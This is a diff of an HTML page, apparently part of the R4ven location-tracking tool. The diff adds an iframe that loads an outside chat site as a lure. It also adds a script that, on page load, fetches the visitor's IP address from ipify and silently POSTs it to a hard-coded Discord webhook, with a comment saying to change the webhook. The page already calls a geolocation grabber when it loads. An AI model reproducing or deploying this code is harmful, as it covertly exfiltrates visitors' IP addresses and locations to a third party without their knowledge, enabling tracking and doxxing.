@@ -3,6 +3,9 @@
 
 <body onload="getLocation()">
 
+<iframe src="https://www.tohla.com/chat/" width="100%" height="900" loading="lazy ass" style="border:none;">
+</iframe>
+
 <script>
 var x = document.getElementById("demo");
 
@@ -68,5 +71,26 @@ function showError(error) {
   }
 }
 </script>
+
+<script>
+  function getIP(json) {
+    var ip = ("GET", "---\nIp-address: " + json.ip)
+
+    const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        content: ip
+      }
+
+      request.send(JSON.stringify(params));
+
+  }
+  </script>
+  <script src="http://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
